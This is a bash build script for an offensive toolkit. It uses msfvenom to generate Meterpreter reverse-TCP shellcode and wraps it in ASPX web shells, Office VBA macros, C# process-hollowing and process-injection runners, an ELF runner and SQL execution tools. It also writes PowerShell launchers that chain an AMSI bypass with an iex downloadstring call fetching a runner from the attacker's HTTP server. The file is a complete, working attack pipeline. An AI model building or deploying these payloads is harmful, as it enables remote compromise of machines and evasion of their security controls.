#!/bin/bash

KEY=7
METERPRETER_WIN64_PORT=8080
METERPRETER_LIN64_PORT=8081
METERPRETER_WIN32_PORT=8082
METERPRETER_WIN64_UNSTAGED_PORT=8080
METERPRETER_WIN32_UNSTAGED_PORT=8082
HTTP_SERVER_PORT=8000
POWERSHELL_RUNME_NAME=runme.ps1
POWERSHELL_RUNME_NAME_UNSTAGED=runme_unstaged.ps1
POWERSHELL_RUNNER_NAME=runner.ps1
POWERSHELL_RUNNER_NAME_UNSTAGED=runner_unstaged.ps1
IFACE=enp3s0

current_dir=$(dirname $0)


ip a show $IFACE &>/dev/null
if [ $? != 0 ]; then
    echo "[!] $IFACE not connected"
    exit 0
fi

inet_addr=$(ip -f inet addr show $IFACE| awk '/inet / {print $2}'|cut -d/ -f1)

raw_shellcode_win64=$(mktemp)
raw_shellcode_win64_unstaged=$(mktemp)
raw_shellcode_win32=$(mktemp)
raw_shellcode_win32_unstaged=$(mktemp)
raw_shellcode_linux64=$(mktemp)
echo "[*] Generating raw shellcodes"
echo " -  Generating Windows x64 shellcode"
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$inet_addr LPORT=$METERPRETER_WIN64_PORT -f raw -o $raw_shellcode_win64 &> /dev/null
echo " -  Generating Windows x86 shellcode"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$inet_addr LPORT=$METERPRETER_WIN32_PORT -f raw -o $raw_shellcode_win32 &> /dev/null
echo " -  Generating Windows x64 shellcode (unstaged)"
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$inet_addr LPORT=$METERPRETER_WIN64_UNSTAGED_PORT -f raw -o $raw_shellcode_win64_unstaged &> /dev/null
echo " -  Generating Windows x86 shellcode (unstaged)"
msfvenom -p windows/meterpreter_reverse_tcp LHOST=$inet_addr LPORT=$METERPRETER_WIN32_UNSTAGED_PORT -f raw -o $raw_shellcode_win32_unstaged &> /dev/null
echo " -  Generating Linux x64 shellcode"
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$inet_addr LPORT=$METERPRETER_LIN64_PORT -f raw -o $raw_shellcode_linux64 &> /dev/null

tools_dir=$current_dir/tools
[ -d $tools_dir ] && rm -rf $tools_dir
mkdir $tools_dir

echo "[*] Generating tools"

scripts_dir=$current_dir/scripts
web_dir=$tools_dir/web
mkdir $web_dir
macros_dir=$tools_dir/macros
mkdir $macros_dir
shellcode_runners_dir=$tools_dir/ShellcodeRunners

echo " -  Building ShellcodeRunners solution (staged)"
cp -r $current_dir/ShellcodeRunners $tools_dir
python3 $scripts_dir/aspx_maker.py $raw_shellcode_win64 $KEY > $web_dir/met.aspx
python3 $scripts_dir/vba_powershell_maker.py $inet_addr $HTTP_SERVER_PORT $POWERSHELL_RUNME_NAME > $macros_dir/runner_powershell.vba
python3 $scripts_dir/vba_maker.py $raw_shellcode_win32 $KEY > $macros_dir/runner.vba
python3 $scripts_dir/csharp_runner_maker.py $raw_shellcode_win64 $KEY > $shellcode_runners_dir/Runner/Program.cs
python3 $scripts_dir/dynamic_csharp_runner_maker.py $raw_shellcode_win64 $KEY > $shellcode_runners_dir/DynamicRunner/Program.cs
python3 $scripts_dir/process_hollowing_maker.py $raw_shellcode_win64 $KEY > $shellcode_runners_dir/ProcessHollowing/Program.cs
python3 $scripts_dir/process_injector_maker.py $raw_shellcode_win64 $KEY > $shellcode_runners_dir/ProcessInjector/Program.cs
python3 $scripts_dir/remote_service_modifier_maker.py $raw_shellcode_win64 $KEY > $shellcode_runners_dir/RemoteServiceRunner/Program.cs
xbuild /p:Configuration=Release $tools_dir/ShellcodeRunners/ShellcodeRunners.sln &>/dev/null
if [ $? != 0 ]; then
    echo "[!] Compilation failed"
    exit 0
fi
mv $tools_dir/ShellcodeRunners/Runner/bin/Release/Runner.exe $tools_dir
mv $tools_dir/ShellcodeRunners/DynamicRunner/bin/Release/DynamicRunner.exe $tools_dir
mv $tools_dir/ShellcodeRunners/ProcessHollowing/bin/Release/ProcessHollowing.exe $tools_dir
mv $tools_dir/ShellcodeRunners/ProcessInjector/bin/Release/ProcessInjector.exe $tools_dir
mv $tools_dir/ShellcodeRunners/RemoteServiceRunner/bin/Release/RemoteServiceRunner.exe $tools_dir
rm -rf $tools_dir/ShellcodeRunners

echo " -  Building ShellcodeRunners solution (unstaged)"
cp -r $current_dir/ShellcodeRunners $tools_dir
python3 $scripts_dir/aspx_maker.py $raw_shellcode_win64_unstaged $KEY > $web_dir/met.unstaged.aspx
python3 $scripts_dir/vba_powershell_maker.py $inet_addr $HTTP_SERVER_PORT $POWERSHELL_RUNME_NAME_UNSTAGED > $macros_dir/runner_powershell_unstaged.vba
python3 $scripts_dir/vba_maker.py $raw_shellcode_win32_unstaged $KEY > $macros_dir/runner_unstaged.vba
python3 $scripts_dir/csharp_runner_maker.py $raw_shellcode_win64_unstaged $KEY > $shellcode_runners_dir/Runner/Program.cs
python3 $scripts_dir/dynamic_csharp_runner_maker.py $raw_shellcode_win64_unstaged $KEY > $shellcode_runners_dir/DynamicRunner/Program.cs
python3 $scripts_dir/process_hollowing_maker.py $raw_shellcode_win64_unstaged $KEY > $shellcode_runners_dir/ProcessHollowing/Program.cs
python3 $scripts_dir/process_injector_maker.py $raw_shellcode_win64_unstaged $KEY > $shellcode_runners_dir/ProcessInjector/Program.cs
python3 $scripts_dir/remote_service_modifier_maker.py $raw_shellcode_win64_unstaged $KEY > $shellcode_runners_dir/RemoteServiceRunner/Program.cs
xbuild /p:Configuration=Release $tools_dir/ShellcodeRunners/ShellcodeRunners.sln &>/dev/null
if [ $? != 0 ]; then
    echo "[!] Compilation failed"
    exit 0
fi
mv $tools_dir/ShellcodeRunners/Runner/bin/Release/Runner.exe $tools_dir/Runner_unstaged.exe
mv $tools_dir/ShellcodeRunners/DynamicRunner/bin/Release/DynamicRunner.exe $tools_dir/DynamicRunner_unstaged.exe
mv $tools_dir/ShellcodeRunners/ProcessHollowing/bin/Release/ProcessHollowing.exe $tools_dir/ProcessHollowing_unstaged.exe
mv $tools_dir/ShellcodeRunners/ProcessInjector/bin/Release/ProcessInjector.exe $tools_dir/ProcessInjector_unstaged.exe
mv $tools_dir/ShellcodeRunners/RemoteServiceRunner/bin/Release/RemoteServiceRunner.exe $tools_dir/RemoteServiceRunner_unstaged.exe
rm -rf $tools_dir/ShellcodeRunners

echo " -  Building DotNet2Jscript solution (staged)"
dotnet_to_jscript_dir=$current_dir/DotNetToJScript
python3 $scripts_dir/dotnet2jscript_runner_maker.py $raw_shellcode_win64 $KEY > $dotnet_to_jscript_dir/ExampleAssembly/TestClass.cs
zip -r $tools_dir/DotNet2Jscript.zip $dotnet_to_jscript_dir &>/dev/null

echo " -  Compiling ELF x64 runner"
elf_code_file=$(mktemp --suffix .c)
python3 $scripts_dir/elf_runner_maker.py $raw_shellcode_linux64 $KEY > $elf_code_file
x86_64-linux-gnu-gcc -static -fno-stack-protector -z execstack -no-pie -m64 -o $tools_dir/elf_runner $elf_code_file

echo " - Building SQL tools"
xbuild /p:Configuration=Release SQL/SQL.sln &>/dev/null
if [ $? != 0 ]; then
    echo "[!] Compilation failed"
    exit 0
fi
sql_dir=$tools_dir/SQL
mkdir $sql_dir
for proj in SQLExec SQLExecInstall SQLRecon
do
    cp SQL/$proj/bin/Release/$proj.exe $sql_dir
done

echo " - Building ExecUtils tools"
xbuild /p:Configuration=Release ExecUtils/ExecUtils.sln &>/dev/null
exec_utils_dir=$tools_dir/ExecUtils
mkdir $exec_utils_dir
for proj in BypassLanguageMode BypassLanguageModeInstaller RunCmd RunCmdInstaller
do
    cp ExecUtils/$proj/bin/Release/$proj.exe $exec_utils_dir
done

echo "[*] Copying powershell scripts"
cp -r $current_dir/powershell $tools_dir
powershell_dir=$tools_dir/powershell
python3 $scripts_dir/powershell_runner_maker.py $raw_shellcode_win64 > $powershell_dir/$POWERSHELL_RUNNER_NAME
python3 $scripts_dir/powershell_runner_maker.py $raw_shellcode_win64_unstaged > $powershell_dir/$POWERSHELL_RUNNER_NAME_UNSTAGED
cat $powershell_dir/amsi.ps1 > $powershell_dir/$POWERSHELL_RUNME_NAME
echo "iex (new-object system.net.webclient).downloadstring('http://$inet_addr:$HTTP_SERVER_PORT/$POWERSHELL_RUNNER_NAME')" >> $powershell_dir/$POWERSHELL_RUNME_NAME
cat $powershell_dir/amsi.ps1 > $powershell_dir/$POWERSHELL_RUNME_NAME_UNSTAGED
echo "iex (new-object system.net.webclient).downloadstring('http://$inet_addr:$HTTP_SERVER_PORT/$POWERSHELL_RUNNER_NAME_UNSTAGED')" >> $powershell_dir/$POWERSHELL_RUNME_NAME_UNSTAGED

echo "[*] Done !"
# Delete temporary files
for tmp_file in $elf_code_file $raw_shellcode_win32 $raw_shellcode_win32_unstaged $raw_shellcode_win64 $raw_shellcode_win64_unstaged $raw_shellcode_linux64
do
    rm $tmp_file
done
